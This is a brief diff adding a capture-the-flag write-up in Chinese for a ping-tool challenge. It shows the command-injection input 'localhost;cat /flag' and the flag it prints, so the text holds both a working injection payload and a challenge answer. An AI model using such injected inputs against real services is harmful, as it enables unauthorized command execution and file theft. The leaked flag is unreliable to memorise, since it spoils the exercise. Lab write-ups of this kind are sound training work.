@@ -1,0 +1,7 @@
+输入:localhost
+显示：PING localhost (127.0.0.1): 56 data bytes，能ping通
+那么可以找是否存在flag文件
+输入:localhost;cat /flag
+显示：PING localhost (127.0.0.1): 56 data bytes
+flag{07413f6f-4df9-4cc4-90a3-ad0f1a325ec3}
+即：flag{07413f6f-4df9-4cc4-90a3-ad0f1a325ec3}
